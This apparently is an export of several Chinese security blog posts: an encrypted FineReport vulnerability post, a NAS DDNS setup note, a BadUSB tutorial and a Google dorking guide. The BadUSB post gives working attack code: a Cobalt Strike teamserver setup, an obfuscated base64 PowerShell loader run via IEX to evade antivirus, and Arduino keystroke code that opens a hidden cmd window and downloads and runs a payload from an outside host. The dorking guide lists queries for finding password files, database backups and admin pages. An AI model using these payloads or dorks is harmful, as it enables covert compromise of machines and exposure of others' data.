7322b83a01b44ca070c785e638af8d8baae65a0b34bcb9d5899c4861911445d36bec15ebeded055b803cf15440db032097193ecdfa3886e32fbd5c277f07b9198384a3cc6d0fbf3d44acbf98c38e9ac934694502f5b8c3fa70fda48c0d37e248107070485685fdafdfe9ae7f04d9ec1cdc63ea6ae506ab6b82cc5fb75465326ec2a782da126e2616fa0b7eeb30ac04a5534657bc529af893912238362141e233a1265a5bd43f17026b24414d9b26a4d983f8851244e8eec3b04bea6959068491efb37772ad9d1bc41b8bb45f71f8b4bfde4d88867f70661f7a98bce3422fcfdc5fa750431b55116753cbeb55e11cd15e5481462f43d98ef35e8378a97bd410b5b193f4ccdf49eec6b3cdab4efe390b7ecb36f24376bf988cb65dcbced73a0e5211ddb9907ac2775dd6c98d2ee7dd9f4432a2620b6b6518452bdb111ba1b847cd0767e06f458c290e026f63f34b194b12aa1ef1fb2a8f1d667868b23eb19fa22d0958c624060af8193333e0daac91809fa1cc826626d82378e6abfdba9505ff737e50051e60599f3f8b7373603b0b425df94c98e01cbb287f4eb36090aaebc0b945c9b394db96fe8b82115feda83680dcc85b165f1441578266062752a9b9678345ef0496f6c3301763d1e250a33cf0443cde468b318734e4702526d8b20dc32d1aa63539dc372a93819e0bd8a5877493c7f42255f550354bdc15c0c322263a0be74ed8df187504576a79d9299c387e73389e7db0137b058d749e31847c1f26f743a6d74a73652359c4c9d23ef9921a98ee88d09610165c23ab15878babb953952976a9ceb54402a3207f3987638b009fa8b5dd92c78ae676c579ee5adc2a99271f4388d10c54a8662edd4711d4e96b803d1d2449888be9ac14557fac2c88fa2d909dbb2d8f15644a27ef14d152f2509fc2458536004629149c0d296e30507c7b65120b4540749f2358459b103819dfa277c3f68d0604b2060fe619e94cc6a03d8d871bdbe3ba2fc29338fc72ba7a02beaff1df86e24c5cce3e8ce7b6578d2cf3ecbabc06d08a2e8a91d819de748acb2d90eb80605039e3c53d2d9086328762aabfd1f1bbc4fb2b162e710d579dcc53933a91113650a8b565ba767874dad9a0fdfd41b53419b0c46a1e5527e0eb8ce7f2047db48783d84bcb4f99f0a009b9d8438972bb9dccf486225a93531f22db2d7cee8e857fcccf53cfaa77e461f9b9ded59d12d945c54a7e764a5e83ceb844caa5fb091236ff8c64a4b58fa9ddb1022924dab96450bd74adb8b85c8d71d6d344e3a48ffe44271115decf69b00cfbe788a52a7d84c14bda55dd4f62fd69a830c7314f2ebb378c6bb92a150c5240e299a42cf0456efb6490d8efb6ae6b825efc95770b9af02f00c2e1c31a02525c84e754cc430e90f87485e84989f73a7428f3565b3a508c81c77b1f055ad7a657e29cc41f9d704e313705dde1a15259eae344a9f57c6903e5f08dcd5bcce8eead5ddc15d731da8ff5943c068b7888f08838a25da6455d138f9cea40c7c1b78efaed9ed2568fa466fbc6b6290a3d0430711465454435a47b7f8b8be0ddf96878ac54067e863d0acb3000ad750b5c0d7d90f10deb21355e422290dd0d378f7f319b5ed90adc942691fcdbf044359a43774195ec8c549397513f3e8fa2df441ed8b3720ee0110259e694d25259e7d3c90f094bc521bfd28d45b6b09861cee0e7c68f703e18f6850e173c7a8e72a3bf9c365d80c22f7a0ffbff6a4fb1f7e4ce04ac53bc76fcded243907717bb4b75378fd630ac107f8a190d4aa6650e648600ffcffd4facd6d29d4ece5975574baf6109c26b9cb04236a17d66fdce0e06c61d8e24961283805d3a896618b2610f37598bd3ad3ad2db3b7843b40bcdf5e300943f061cafc6633f6a2ba0ec208d593608564a9333e820bb90aa2c8393b82ca09b35f5216ae7d5d3ecafde19db6a1d9286c8675622ec07511008107f49da752b4db83a6bb2e1a2751ec3528798a7f2e346f0acb8dd0d8a13a3a3d6b3e58ba5a90f2b7fb707d30c0d17b8c90bbceae05d84e8c2dec2b06d99ee3bcb846165b32a425138410747e1065795bb079ae4f98b4cbae5c6259e39b9a430f0d8efa7df1c164f88ea2e6dabda3d68cb130bf71cbf171d31bf374cfdae7135569d76bdbe573c8615615cc8a213b768acd37a990a0d2b0a5cb1f934872f7dcff23bf3731b695cc729631b593d543a56676242d44ecf1f33626c15580b3be996f771711ea5e4393e50aefa8d44c3f3ce8a1d2ae48cbaae4e2265a9a7730ddbbe52a82fb11bcb6212a612a2fb0882396456cec737cc3d59f3789253dd44b6beaa58621ca30a30791ef06fcb90ff4680571ed4370cfb403ed95365a1c930fd83c734b64c35214eaaab48639264bbd5f8cbcd481301ddf0488731c6751a14cb26f22d49d9c5abf73c9b1e72d1e443905075a8612430c11bd04ca25200e9f98eabbb4ab77cbeb514114bf71ade40107604b6bc57a965479e9f987a25735ec1be7f310652154a308ff69b2031e69019833ab539a9dbd228006a4cdd5becf9bfdfa2101cf2abf766ad092542c1af6de27715f6757d765752388593dd9cc9a006dc0a7d3a9236928887ece5db8779690813b19991b23077a6581183c55acb2cf1f9ead74a215052b0cb29aefc9f77178fbfb2c915250e06adb1ce05824d5987baf6495ca2a2552841b20e2e1b55ef6e779331f79212444bdce377260a76589a294494e2c48c058f144de9f8b3419e80f051f51d140a1aba3fd38473d84c698bf22cf28f3432c2a65dcf23d4cc8c3be004f25548cfe73d115ca854424e08edea1ab1a1354f1a1a657fd999211d9990c3b186d6212fefdf622e940d58bdd5b93f72f8f0cd6c32a3928ebf13b0d12fb666556d9cb1e5bf9dbb47aa36ebf6f3434a97addd8967bd45b833e35ee4c996f74ae4ade6c11fdc2a491c273a9749a808182dacb47bb015d8bf4af06895cc1c2803c56ab6b478353916fb73b15da49dc82460f354edb5f49f8b60e4cdcb760f29a79aa6193a90bd5210b4bdc528f776edf5c7b4d30478aa13b558f427dd7bc7c6802715de036287ec96d981514beb2feb29f0e094376fb1f83075b4499c304daaa9acbef29e30992f96e5fdc36f4148e49ddfc144768444603cf6e5c2b61f9fea371709646b9fd7a19aa9a7321ae16f8c63ce1ca80340f5643bef4674bca4173f25ec0be9c6d7b2a60a7402aa800fa7e1c80df3c3f8a976a26038a7040f5cf19c6b909dcd690defcd5a8d4ba5ab4508c399bdcc58004b620675ef58633c2affe819e9f8b80bccd1f6a8e1193c36f1b30d3d8b965d6db6a6ef325ec5c3450327fb497037b9a3d740214bfbcd42bb985e428687f4fd7be32357d355a9e1b1c853cc5dc564e57a96587f9790fddbf22a5995d681a6a2aafc5e4b8eb1244459a8857d100d1247cb3ad52506bd8d3e4953f7ba7b7b58e29e373674bf63acdba18fe92a3874c595ec6e40657fd214783df061d585d14a063419eb41d6a5a327e4d5526bf5bb85c308885668e39e18c597a4d4df34330683feeadb08da063c5f5a232f1468cfdeb57902afda248c5859642420709acadeb7f47af04849059a1677286c205b6b64098a6369954a2b829a7e2c472140bca084117e79d96360c6cfc98533bbe75b8f12e5158fd39c97de51c7d0232d4d0c0c584407b1704833d9cd47fe554365bf1383cadd556dae2ba213f68249dfac860f5c44b9507d8bcc179da0e7d4893ea3338acb497d08eb3cfd0c7441d4f2f939ba2cdfbdb3817ff3ed1faf704661074fd5bd6d95367cf53437b1fae4829f3bcedbad7f8734915aace156f33e1b7f848a9665276dd36baa051f3657213d85b47e7a463bf78442eba7f0f3afe5146433a5bd1649fd40b478fe2e73b6f433a7eb5d4c2a2bc64945daa5faea0fec69b0ba8b43b10629340e602ded0286d4f65ab4707024d3cec350922ad0ef6861a21088641fa0e70a7875b04584263a9ad6a0bd317c4c1d799067dba47d8f510bbd5119487044dcef053ab4f174dd8624e667f6b9c2d45711824cfa1fa22124e89368a973ea3e73504f5a60efde9595704b5a0b533785f0fc9b8d246b197220bca31893c06405bdb045006a968b8606c135ca344f7094f6299a8fa45510fb71128c39dc56cf52e631936b3fc3abbdfeb44e7eaf5cdc3406952cf9b41daf20b63c96c218dcbdf328dbfc0ef3b02160bd611a0e5b01a2e2fae4d9d6c0e575c1dff088d0ab8ccfebc547066ef67aaa8f1490768a1cad257035e8bc828f90838157c543dd72a3a56a920fa2e0e6e7520fef3a14b52c658f4e311c7214659de5ea94d700a97d2abc1050be6071d3499ded00e18e691d9a2525eeb8e431a7254443b387329516490bcdd1dd1f6e62f2440db48fbaa11632812bea0c11cc162c300c41876f60d4ab3c6583d7131408a2242055425c9f2b2c4e2f3d74d695053b8626fb1899546eb914120075558b4f0368ec4d046e32fc766b7d2628c181a7e08bc3517780096f078ea0412b531b045f0cbbca007b0325bbcaee9cc69f4c7d236421d06bf97c2d0364c22ea9a696755349e59e0462864e1a6379a0feb860c996a2dee49322f13e9eedfc67f8f060b1c4d17f181c935a13dc37a3ac54f41f52cb42723b93282f0729d07c3a101c1e45e28aa2127ce04c7072eecbff3d29e206087b544702f3805a5019d3d8a6aad76c84b6aa1977ceb031b78348b8de15f33f572d53ae85ecab6c199d89503272a75f44e64e6daefca1fa9ab1de666303962c5593aa8fdd135ec53b42be41508a5b03282322f2df6328b5fa4f37e9a1a74515ff91f6dbe6650c8c9fab0510e7f42e38ef9767d672952f775f43d7003d1b0cbe35060d7b93abb208722e3a65c56cc213ec0a20bf2230fe6344e120f27edc3a302819ecc779365b48a2efcc211e41df41207cf12e9c5a5fa565484a7f0faf557ed05bd74501284d11f310e91606c426cddc9f81439da9f19f7ecbd6fb780157b69487ffa18f8e71e903e997bcfd57c3ef81d12b3b5e1f3c9474e86725b4304dca5caf62bfc8abbdccf2fd17c551a8ff1d9f4d85048e679bffffeb1d054a3091d2207f287ee1dab22e2f5b40bf0c6dbf41e6ffed33f3ed31795767c3518ee89a2571cebecc34f4176a8d75fc83b1ad0db8ab466c366a669b9ef1309b7c7681d86659323b16a2a36181860c7d9b087f4bf426ffe4650a598ef94627e879f31851d25a0cb5ea3edbea5b24de6a7b65cdb4dbcafbca016422ebdeda841c2f588ed3a5a632913d9617d1d8ad90527ab23fd6ef718f98f05fd59fd02ad23b472d44af4f7c1a910368758d03b3e494a40dfcfee138b96114e52481b373ba9c7e43ad44889f5661c2f1a0ae9b5c1777daa75b083a5e2cb236a6c1fa81a20f67604cfbcf2bf06d8dcc1f164ed474fa120266d564c6882d32449edda467959a0d33daeefb4ee7cc1da9823a9c06488a880be7ad95186aa1a15c689a41f4f67f21eaecf3d01db262e506837207be54744b9bcab9d1848ac11f512a38a0c337c8c3ddf91104c9b0950ba1ffe419785d8ea7e9add5dfb7bfaa11abe3e27e59364518122bcdb1092fca839222176f58427d40a8cb8655f14cfdc2c92fc8052c94986c58a076feead7f0166c8651ebc44272541d236f65c583eae25a188dd6b9956435806a5917cc6ed66a4d4d33a6d4be43cdf14cd2178644a116fa338bdec399c5b86d4481af3429d2737783b601cb406e1e3e9e765c22839105aa9527a45145b4de55316082ffb4add999fedc1c35a100f81342c60df65ff27f548c45a0c21d5c0b5c25a705a005ca194b21e137150bfcdb1e50208f423db059751ab488ddfdaf48229d69892def1515dd9e45f56904cdb2d350507ab177cda08f59d02925150e0b5c751addba8bd8d99558977207e5c2dc5f9e8c1056f3ef124333a0cdbb6033d078c12e063fd1b704e1a173e1af0cda3ad3b13737fdf91b34f2ed54e68b5fc6d1e4b63c5d04bb685d0c695f94059bd00497046434c0b05f855e60796bdd9a9450fd0f124f146250c3a303d029d3eef046ba1a56ce39e0418509a51ea45eb22f7b1e8882f44d4485f10a5e0a2732c0116dc6c9de3c12e9ca8f7b32a425be12db339ad20b4427f52d683c5eb07c2fdc48f04b8bd19e88eb007e4ac469516cdf1724845fbbba4965a130c01f784e86a74d940686b073053cfeae4d9584c4517c58682a33f3a6dd7f2b33d5bc612cba5746cc77046ce0dad934f6620088a3a4d081e2cbb3c0f22c4cded54fee919b666bf38700d68e3d051d5235f821dd5dc10f314636e7219fe743e01807113a041184c073a63a0a90d68b118868eb520aa36b1678c476732f55ec50dc2e5a59e4f40725054515f37a7c4f408e787b16b2a397e5bf1b2363104bc953718c344f97666a549a7dca964aef5b811f9be68296d430b11be54f099985f6dc245be0a780e67b2fb7885bddd14cd6a77e312f33d260deeecaacfd8d12a1b9984a2662d5525831e9d8a7987c1647ec5bb7227a14d4a211219bfbd44cc7c40fc3f99917e20aaa77a32989bd1517cdd858bbb3ab33e58a66dacf9cb8662df98488f882f36430b9ec1ef7acbf8430fb5a8cc7bc4e5a9985d073a7ec40e2eaa0618c284b0333761c47047da606864710d2f743cb60b91414a018b744ce77d7e4d02be40f1c56df4a2202a2bdc81b70897f12e6d4fec4874a5506a74ab6ef2c7d4d0b273663caf27a4cdc7ee2e8065f2c4519ec12603a6bdfbef8efda7ae69eeab995f1f2bbfb4b4f002ce072cee6315d21a457b05b4263d4710312c833a82c160e05c826de0eae4fd067babce60686f3541b5d40b2195e936230e3d19b72744aa105bae85015cc48a860a57b9c5e2eebbe06c2c02c91a38f5e627f323d810d7b1af8a333b92db58b3581388ee17d101ee697448f3b49bf86bb70d67546a28cd07d6ff03e704d00db46f21d8ff05b839ed41edf6cf67f6e8e825d013e50866ccda8dcc77936e6d90df2efc08a3a9963d63d2d9f787e70ae63a3c2932b8e253a12878c0485720f34594af0a2001e141343825c4eb0c3b952f377effeb32e18755df98739f294e8ebff87424662f7ac4f97640b3c3195e3e71c2347ca4f30c93a1f618a5c63990fca8344c5e4e00a6b65d995682fd67d9276cf467f1572a2d08080053c089547b7577c4613e5c90d6938e1ef9b54f1308bf3ac6ec1377d197df9815a2bd78481085cd56029739992b8465ed4ea65334b41d7de915dad8ab62e90472012f0c4ff982ca6c8ebd6cdf92d81d9ac31d7183e4ad316fa23b0801dca493b41a0f72ffa764f89653e50fe277028ded18e3c78c3b3dbdbdd7def42ac7ac26005f085dfd65f8868a0a85f86115885c346132aaf4d0ecd89d9c61394748a678b74f6ebaed2505308f08766fd868c6c87d6d2cca48715fd9b63211e739ca4d0a76ebb71ffee5814214a74da7287f15cf89d6568ec7cd5a9f364a520ad5e22bf0fcf134b6fd24ed2b25b80c0ff0ab8233bd6cdedd3f626c7c8b623920d27e1f6b519ed1601dd08f97e23d7ac22acf2b7ca98d4329a02cdeee385d299a6292010e369e35fbf0c8890a4e84dc934c8bccf9ae1a39bc53ff3d3b4586262042e22dd5d887ffd4ff8ab814a86f61f51a70b521be7b2421ff0ff9752ac01c0e29106588c3222bf63a274d974815f214376fe01fd0c8615d59a9556abf8eb0e6ed89e97ca1f640291ab7fe8d45564baacaaa5ffbd508d1a7a652483655c59e5c2ae2b7fd80624579b6694f7a0abc30ce441273cc1e26578fcb13ad1d68018b592ff8aa60a5406786a02cb30b64406e75266758b592c66f18f75f20f76cd5f4f6a4058f96eab3aa1f899ddb19992d45613fdb04978241fe8b05c4facb4732268cf996b86e32b105343ff7edfc4f059672780c9d40d56b6d7909cf00265d5e1b6d93c87fe6e6839339fafa3c14f5119cd68a551218727313950adafc4e9f2e8c284265267a903f82ad0c45d2229bd6e51016a2cf4db6469ec7b8dad6a0d8dfd726311056b20e220f770ee28976ce9d0cedb897f7fefba4b79ad5d14014d1cea30b40d40cb48116a6607e101b6e494e665fbdb3b27be761a06fb4a515c40e9cf60b660cfd4a4c2ddf515fdf4c0ce071fc9f2767ce07e5992905270a54eb9abc3bfa0d0e0fd572c5e0f99887aaf0fb386efefb9fed6aeee13fbe674a390804dff8d8269331a890a16572d1c77dc13e6a1f68d8fde06f4678ffc9bd2ad456bc97f4ef52e0a7ab835355dbfc7e0139309e1e39ea5d0aba0d6eda06b6399373d7a52e6a9146e39359e884a5fa1bf48f2e606d47f4dd9f53396fc95d6b9a78b56a97e1d98ef3f67d9c66750820356bb450ece06e3e284a6a2509a3946f0be5b44073e36fc3db91235ea607a40e19ee0e4be1b63095aa77073a441b4da75f78ef7d18a555c2e124ee031791319e51b5a9bd1b3401cf8f3c3599b3a19a3a908bb200047a3623975c8fdfce6074e60ea83c3536d5fbc9f22a12ee774e23e4dd54c3e1c6183d761826baf9d24126c3fa448da7a90d80bb815db4fdeb71700382a750d5125e0e42ad17abea392cc8823a01a5c9b1402ad5fbc0bbc9e776fda0791b26da2a326d8a2aa8facbffc3adf02ef9bb49b2d81106c016dc4ba4e259d7f649b9bcc3c9b7335d5743bab38a5ebeb958c5dcf462ce761fff24107587677da0fe59cf222466eb49ac86d7c4be540d4a5853c7b0f08faa19739c8fae029a45e010712e345a9c4bf8e7dacbc30eb51b9e527e2add8dc6f75548bee46cde008a3480b25cc4e627a3f897dbaf9ee1f26b9842733982dee5cd64fa1e65cb35d87409fc4407fc8d49eb19e9da10b3ce1eb7ab57871fc6c346261477670c87f1b9cb4e38335d5d7a690e072dcb29d6a0ca2fee0ad54fe982c4835b89d63f6b60b672bc3cca339c0a4f28dcdfb7c2d87c8939d1c51c2ffff3ff6fdae1924d9d93cc363cab3fc9244491787fd79c3b47ff92e89e8ce01dd202464feeb792c84ac4b2d5eb069045f50e020336d65507ef5528b499c0e806412009581264a6c639acf852a2dda3e02b6ef482b867e32acb170afe056e75a4fbdc2201ea81617be13c0e64c6bfa7ce8287fc0d2607b24c9c745f9ec92a37c6ee03bfa64a094ef2a42b3124ca821b16eded9bba32d27229c3ba6e56ebf3e2fae23e6635a6e920ea66906838b14bd016b2c3f5ad335872bb136736081fdcb05094977e612cede70b48f5512fe42362cf44766169734dfb19a1508f37bf1286ac7b299dee352ca469114bcbead69a814cfd021ed561ec94b8c18336a303cb5198b0da46a416161a35f9032207b659efcbd5f3829d49514fcdc0f64d5b8dc82be59c1fb758c230074283e96a9493845e5c3063eaffac32b4d2c88005ba401d33d203d5c54d9a5f839d0a7ab41c44ae16a69f8690407b63ecba3840389cc26d3acc146e2b367e9433777aa63def51a4eb80caa5e6fa31124940791aa441291e1500b04fc72103ab0f256899ed766dc86c6096bf99d33578f036c39c9cecc0ac612a3bde94e9f1ee77102e65fd49fcf98088328aff4ce70fe81c37e6f1bf1fe11529c9232287604b4c3b8d48024c374d70528cc4f9366cf2db4552
  
    
      
      
        Hey, password is required here.
      
    
  

]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>FineReport</tag>
      </tags>
  </entry>
  <entry>
    <title>DDNS GO实现动态解析</title>
    <url>/2023/03/04/NAS-DDNSGO/</url>
    <content><![CDATA[首先到套件中心安装ddns-go

接着打开ddns-go后填写ID、token和Domains的信息即可，腾讯云的话可以直接点击创建密钥来生成ID和token

具体可参考文章：https://cloud.tencent.com/developer/article/1921363



然后回到nas的控制面板里直接去搜索一下证书找到位置进行新增证书



然后去之前申请证书的dnspod中下载证书文件，这里选择nginx

将下载的证书文件导入即可

]]></content>
      <categories>
        <category>折腾实录</category>
      </categories>
      <tags>
        <tag>NAS</tag>
      </tags>
  </entry>
  <entry>
    <title>BadUSB配合CS免杀实现上线</title>
    <url>/2021/09/14/BadUSB%E9%85%8D%E5%90%88CS%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[BadUSB介绍随着互联网技术的发展，USB 能够连接到许多不同的设备，包括鼠标、键盘、相机、摄像头、无线网络设备等。但不幸的是，USB 的设计方式产生了这个 BadUSB 安全漏洞。
BadUSB 漏洞是由安全研究人员 Karsten Nohl 和 Jakob Lell 在 2014 年黑帽会议上首次发现并暴露出来的，这也就让USB安全和几乎所有和USB相关的设备（包括具有USB端口的电脑）都陷入相当危险的状态。
就狭义来说，BadUSB是指形似 U 盘的设备，内部的电路在上电之后会被系统识别为键盘，此时该设备内部的芯片开始与电脑进行键盘通讯，仿照人的输入习惯，来操作电脑，以此达到骇入电脑的目的。
就广义来说，BadUSB是指一切会被电脑识别为  HID 设备的，外观却不像键盘的电子设备。现阶段有的 badusb 是形似数据线的，有的则是手机加定制内核，以发挥 BadUSB  的作用，更有甚者，将 BadUSB 开发为模块，可以嵌入任意的带 USB 接口的设备中。
准备工作购买 badusb（序） 、 烧录器 、 云服务器（推荐vultr）；共计开销大概二百五?
①.在服务器中上传cs、screen，用于制作cs免杀马等
sftp root@IPlsput \xxx\cs.zip ssh root@IPapt updateapt install unzipunzip cs.zipapt install default-jdkcd cschmod 777 teamserversudo ./teamserver IP passwordapt install screenscreen -S test

②.下载并安装开发环境Arduino
由于 Arduino 的易用性，现阶段最常用的 BadUSB 还是基于 Arduino 进行设计的 下载地址：https://www.arduino.cc/en/software （有Windows、Linux、Mac版本，PS：建议别下最新的）
③.通过 zading 软件在电脑上安装对应的烧录器驱动
首先需要让电脑识别到我们的BadUSB设备（PS：需要找老的type-a线，新的我试过去貌似都无法识别）

然后打开 zading 软件，点击 Options - List All Devices，找到我们的 usbasp 按照下图设置好驱动

当其在设备管理器中显示为 libusb-win32 devices 设备时，就意味着安装好了烧录器驱动

④.下载并安装烧录工具 progisp
网盘链接（提取码：xrb9）
CS免杀操作制作CS免杀?

将其base64编码处理一下
Set-StrictMode -Version 2 $a1 = &#x27;base64编码&#x27;$a2 = &#x27;base64编码&#x27;$a3 = &#x27;base64编码&#x27;$a4 = &#x27;base64编码&#x27;$a5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1+$a2+$a3+$a4)) If ([IntPtr]::size -eq 8) &#123;    start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $a5 | wait-job | Receive-Job&#125;else &#123;    IEX $a5&#125;

将其文件名重命名为全大写的，然后通过CS上传至我们的公网服务器上（攻击 - 钓鱼攻击 - 文件下载），实现全程无落地✈

然后将我们需要的操作搞成思路，形成最基础的想法，接着将思路写成代码，通过 Arduino 编译生产hex文件，最后利用工具 progisp 烧录到我们的BadUSB中

附上部分关键代码
//payloadif (onetimeOrForever == 0)&#123;  delay(1000);  Keyboard.begin();//开始键盘通讯   delay(1500);//延时   Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);  Keyboard.press(&#x27;r&#x27;);//r键  delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  delay(500);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.println(&quot;CMD /t:01 /k @ECHO OFF &amp;&amp; MODE CON:cols=15 lines=1&quot;);   //使用最小化隐藏cmd窗口  //cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN  delay(500);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);   delay(1300);  Keyboard.println(&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://IP/payload.ps1&#x27;) | powershell -&quot;);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);   Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯    delay(1000);  Keyboard.begin();//开始键盘通讯   delay(1500);//延时   Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);  Keyboard.press(&#x27;r&#x27;);//r键  delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  delay(500);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.println(&quot;notepad.exe&quot;);    //打开记事本  delay(500);  Keyboard.println(&quot;                                   $$$$ &quot;);  delay(500);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                        $$$$$$         $$$$$$&quot;);  Keyboard.println(&quot;   $$$$$$     $$         $$         $$        $$$$&quot;);  Keyboard.println(&quot;   $$         $$$$         $$         $$        $$    $$&quot;);  Keyboard.println(&quot;   $$             $$         $$         $$        $$        $$&quot;);  Keyboard.println(&quot;        $$        $$                                 $$         $$&quot;);  Keyboard.println(&quot;          $$$    $$                                              $$&quot;);  Keyboard.println(&quot;            $$                                                      $$&quot;);  Keyboard.println(&quot;              $$$                                                  $$&quot;);  Keyboard.println(&quot;                $$                                                  $$&quot;);  Keyboard.println(&quot;                  $$$                                              $$&quot;);  Keyboard.println(&quot;                    $$                                          $$$&quot;);  Keyboard.println(&quot;                      $$$                                      $$&quot;);  Keyboard.println(&quot;                        $$                                      $$&quot;);  Keyboard.println(&quot;                          $$$                              $$$&quot;);  Keyboard.println(&quot;                            $$                              $$&quot;);  Keyboard.println(&quot;                            $$$$$$$$$$$$$$$$$$$$&quot;);  delay(500);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯

至此，我们的BadUSB配合CS免杀上线就已完工✌
防范措施不要随意使用未知来源的USB设备
总结未知攻，焉知防。我展示如何攻击的目的是为了让大家知道这个漏洞，了解并认识到网络安全的重要性，更好的进行防御，而不是以此为武器去伤害别人！
注：此文章仅限于安全研究，违法犯罪与作者无关！

    
]]></content>
      <categories>
        <category>研究随笔</category>
      </categories>
      <tags>
        <tag>BadUSB</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>Google信息搜集语法利用</title>
    <url>/2021/12/25/Google%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%AF%AD%E6%B3%95%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[一、site，指定搜索的某个网站。
例：在example.com里找包含login的页面，后台入口
login site:example.comsite:example.com inurl:adminsite:example.com inurl:loginsite:example.com intitle:后台

找子域暴露
site:*.example.com

找接口路径
site:example.com inurl:apisite:example.com inurl:swaggersite:example.com inurl:doc

二、filetype，指定搜索的文件类型。
例：找敏感文件
site:example.com filetype:xlssite:example.com filetype:sqlsite:example.com filetype:baksite:example.com filetype:log

其他玩法
# 含密码的Excel文件password filetype:xls# 标记机密的PDFconfidential filetype:pdf# 政府站点Word文档site:gov.cn filetype:doc# 可能的数据库备份backup filetype:sql# 中文敏感资料员工名单 filetype:xls

三、双引号，代表完全匹配，使关键词不分开，顺序都不能变。
四、减号，使搜索结果更准确。减号与前一个关键词之间一定要有一个空格，与后一个关键词之间一定不能有空格。搜索结果为，匹配前一个关键词但不匹配后一个关键词的结果。例如：seo -搜索引擎。
五、AND，逻辑与，这个命令我们其实一直都在用，只是没有意识到。一般用空格代替，还可以用“+”代替。例如：霹雳布袋+败亡之剑，返回的结果同时包含两者。
六、intitle，在结果的标题中包含关键词，一次只能搜索一个关键词。
七、inurl，返回的结果的url中包含关键词。例如：seo inurl:byr，它将返回网址中包含byr，而内容中包含搜索词的结果。一次只能搜索一个关键词。
八、allintitle，在结果的标题中同时包含多个关键词。例如：allintitle:seo 搜索引擎，起作用相当于intitle:seo intitle:搜索引擎。allintitle属于排他性指令，不能与其他指令结合使用。
九、allinurl，结果的url中包含多个关键词。例如：allinurl:byr jobs，等于inurl:byr inurl:jobs。allinurl也是排他性指令
十、define，查询关键词的词义，起的是字典的作用。Google会返回包含查询关键词定义的网页，例如：define:computer ，支持汉字哦！
十一、xx in yy，单位换算，xx和yy代表需要换算的单位，且xx和yy为单位的英文缩写。例如你想知道一盎司等于多少千克，只需输入：1 oz in kg。
十二、weather，查询某一地区或城市的天气。不过我们这一地区或城市必须是Google能识别的，例如：weather:beijing，Google将会给我们返回北京的天气。
十三、intext，在结果的正文内容中包含关键词。例如：intext:剑圣，所有返回的网页正文中都包含“剑圣”。
十四、allintext，在结果的正文内容中同时包含多个关键词。排他性指令。
十五、星号（），通配符，可以匹配任意字符串。例如：搜索擎，则返回的结果中不仅有“搜索引擎”，还有“搜索巨擎”之类的。
十六、“..”，表示数值范围。例如：手机 2000..3000 元，注意“3000”与“元”之间必须有空格。另外，也可以是三个点。
十七、OR，逻辑或，可以用“|”代替。例如：霹雳布袋|败亡之剑，则返回的结果中，要么只含有“霹雳布袋”，要么就只含有“败亡之剑”，不可能是同时包含两个关键词的网页。
十八、info，查询网站的一些信息。例如：info:bbs.byr.cn，它只会返回一个结果，是一个选择列表，列表的选项是这个网站的某一方面的信息。info&#x3D;cache+related+link+site+intext+intitle。
十九、related，查询与所给的网站类似的网站，它会返回Google认为的可能和你提供的网站类似的其他网站。例如：related:bbs.gfan.com，会返回安卓巴士，eoe社区，91等站点，但不会返回机锋网。其实这个命令Google经常在用，比如我们搜一个东西，Google除了返回给我结果，还会在结果下面给我们返回一些相关的词条。
二十、link，查询链接到这个url的页面。例如：link:bbs.gfan.com，会返回机锋网的所有外部链接。从其他页面指向机锋。
二十一、linkdomain，查询这个url链接的页面。例如：linkdomain:bbs.gfan.com -site:bbs.gfan.com，这样的结果比较准确，因为扫除了本身的干扰，它将返回机锋网链接到的页面。从机锋指向其他页面。
二十二、cache，提交cache:url，Google会显示当前网页的快照信息，从而替换网页的当前信息。这个命令现在也被Google集成到了搜索结果里，当你把鼠标悬浮在搜索结果上时，右侧会自动出现此结果的快照信息。
二十三、计算器功能。输入数学表达式，然后Google返回给你一个计算结果。强大的Google不仅支持普通运算，它还支持像三角函数、指数函数甚至是对数函数这样的高级运算。关键是，你会输入这些高级数学符号。
下面是三个不怎么懂的命令，很少用，而且在有限的实践中也没弄明白是怎么回事，抄一段网上的解释在这里。
二十四、inanchor，它返回的结果是导入链接锚文字中包含搜索词的页面。比如在Google搜索：inanchor:点击这里，返回的结果页面本身并不一定包含“点击这里”这四个字，而是指向这些页面的链接锚文字中出现了“点击这里”这四个字。需要注意区别与inurl，inurl是网页本身的url地址，而inanchor是在外部用于指向该url地址的文本（..之间文本）中找。例如：inanchor:download，你可能会发现有“FlashGet最佳的下载管理模式”，而该页面中根本就没有“download”字样。
二十五、allinanchor，inanchor的排他性指令。
